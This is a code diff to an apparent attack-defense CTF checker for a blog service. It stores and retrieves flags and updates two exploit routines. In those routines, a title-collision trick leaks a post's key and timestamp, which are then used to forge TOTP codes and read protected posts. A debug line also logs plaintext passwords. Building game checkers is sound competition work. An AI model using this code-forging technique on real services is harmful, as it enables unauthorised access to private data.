@@ -112,33 +112,39 @@ async def login_user(task, client, logger, username, password):
     logger.debug(f"Successfully loggen in user: {username}, with password: {password}")
     return r.cookies
 
-async def create_blogpost(client, logger, cookie, flag, is_private, is_hidden, inviteduser=''):
-    title = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
+async def create_blogpost(client, logger, cookie, flag, is_private, is_hidden, inviteduser="", title="", isexploit=False):
     secret = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
     body = flag
+    if not title:
+        title = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
     formdata = {"title": title, "body": body, "inviteuser": inviteduser, "secret phrase": secret}
+
     if is_private:
         formdata["private"] = "True"
-
     if is_hidden:
         formdata["hidden"] = "True"
 
-    r = await client.post("/create", data=formdata, cookies=cookie)
-    assert_equals(r.status_code, 302, "Blogpost creation error in create_blogpost function.")
 
-    if is_hidden:
-        f = await client.get(r.headers['Location'], cookies=cookie)
-     # parse html to get the post_id
-        html = BeautifulSoup(f.text, "html.parser")
-        article = html.find('article', attrs={"class":"post"})
-        el_a = article.find('a', attrs={"class":"action"})
-        postid = el_a['href'].split('/')[1]
-        logger.debug(f"postid is: {postid}")
-        return title, secret, postid
+
+    r = await client.post("/create", data=formdata, cookies=cookie)
+    if isexploit:
+        assert_equals(r.status_code, 200, "Blogpost creation error in create_blogpost function -- for exploit")
+    else:
+        assert_equals(r.status_code, 302, "Blogpost creation error in create_blogpost function.")
+        if is_hidden:
+            f = await client.get(r.headers['Location'], cookies=cookie)
+            # parse html to get the post_id
+            html = BeautifulSoup(f.text, "html.parser")
+            article = html.find('article', attrs={"class":"post"})
+            el_a = article.find('a', attrs={"class":"action"})
+            postid = el_a['href'].split('/')[1]
+            logger.debug(f"postid is: {postid}")
+            return title, secret, postid
+
     return title, secret
 
-async def logout_user(client, logger, username):
-    r = await client.get('auth/logout')
+async def logout_user(client, logger, username, cookie):
+    r = await client.get('auth/logout', cookies=cookie)
     logger.debug(f"logged out: {username}")
     assert_equals(r.status_code, 302, "Logout did not redirect to index")
     return
@@ -165,8 +171,8 @@ async def putflag_zero(
     authorcookie = await login_user(task, client, logger, author, apassword)
     user_to_invite, upassword = await register_user(task, client, logger)
 
-    title, secret = await create_blogpost(client, logger, authorcookie, flag, is_private=True, is_hidden=False, inviteduser=user_to_invite)
-    await logout_user(client, logger, author)
+    title, secret = await create_blogpost(client, logger, authorcookie, flag, is_private=True, is_hidden=False, inviteduser=user_to_invite, title="")
+    await logout_user(client, logger, author, authorcookie)
 
     await db.set("nec_info", (title, user_to_invite, upassword))
     attackinfo = {"title": title}
@@ -194,8 +200,8 @@ async def putflag_one(
     authorcookie = await login_user(task, client, logger, author, apassword)
     user_to_invite, upassword = await register_user(task, client, logger)
 
-    title, secret, postid= await create_blogpost(client, logger, authorcookie, flag, is_private=False, is_hidden=True, inviteduser=user_to_invite)
-    await logout_user(client, logger, author)
+    title, secret, postid= await create_blogpost(client, logger, authorcookie, flag, is_private=False, is_hidden=True, inviteduser=user_to_invite, title="")
+    await logout_user(client, logger, author, authorcookie)
 
     await db.set("nec_info", (title, user_to_invite, upassword, secret))
     attackinfo = {"postid": postid}
@@ -271,7 +277,7 @@ async def getflag_zero(
     logger.debug(f"response: {r.text}")
     assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")
 
-    await logout_user(client, logger, userdata[0])
+    await logout_user(client, logger, userdata[0], cookie)
     return
 
 @checker.getflag(1)
@@ -304,7 +310,7 @@ async def getflag_one(
     logger.debug(f"response: {r.text}")
     assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")
 
-    await logout_user(client, logger, userdata[0])
+    await logout_user(client, logger, userdata[0], cookie)
     return
 
 #find timestamp and postid for post given by title
@@ -391,13 +397,15 @@ async def exploit_zero(task: ExploitCheckerTaskMessage,
 
     rangep = int(60/totp_device.timestep)
     for i in range(rangep+1):
-        usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
-
+        usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
         r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
         logger.debug(f"response: {r.text}")
         if flag := searcher.search_flag(r.text):
-            #await logout_user(client, logger, username)
             return flag
+
+        totp_device.init_time = totp_device.init_time+totp_device.timestep
+        totp_device.calculate_current_timestep_count()
+
     raise MumbleException("Flag not found in exploit")
 
 @checker.exploit(1)
@@ -430,31 +438,23 @@ async def exploit_one(task: ExploitCheckerTaskMessage,
     heading = content.find('h1').string
     title = heading.split(' ')[0]
     logger.debug(f"the title is: {title}")
+    title, secret = await create_blogpost(client, logger, cookie, "some text", is_private=True, is_hidden=False, inviteduser=guest, title=title, isexploit=True)
+    await logout_user(client, logger, inviter, cookie)
 
+    guestcookie = await login_user(task, client, logger, guest, gpassword)
+    r = await client.get('/auth/accountInfo', cookies=guestcookie)
+    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, title)
 
-    title, secret = await create_blogpost(client, logger, cookie, flag, is_private=True, is_hidden=False, inviteduser=guest)
-
-    # use the title to find relevant info
-    time, posturl = finddata_for_exploit(r, guest, title)
-    default_key = "Correct horse battery staple!"
     #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
-    timestamp = int(convert_str_to_unixtimestamp(time), False)
+    timestamp = int(convert_str_to_unixtimestamp(date, True))
     totp_device = Totp_Client(init_time=timestamp)
-    totp_device.generate_shared_secret(default_key)
+    totp_device.generate_shared_secret(postkey)
     totp_device.calculate_current_timestep_count()
+    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
 
-    rangep = int(60/totp_device.timestep)
-    for i in range(rangep):
-        usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter+i)
-        #logger.debug(f"round: {i}, user: {username}, accessing post: {title}, timestamp: {timestamp}, usercode: {usercode}")
+    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
+    logger.debug(f"response: {r.text}")
+    if flag := searcher.search_flag(r.text):
+        return flag
 
-        r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
-        logger.debug(f"response: {r.text}")
-        if flag := searcher.search_flag(r.text):
-            #await logout_user(client, logger, username)
-            return flag
-
-    #await logout_user(client, logger, username)
     raise MumbleException("Flag not found in exploit")
-    #assert_equals(r.status_code, 200, "Wrong status code in exploit function, @totp")
-    #assert_in(task.flag, r.text, "flag was not found in blogpost")
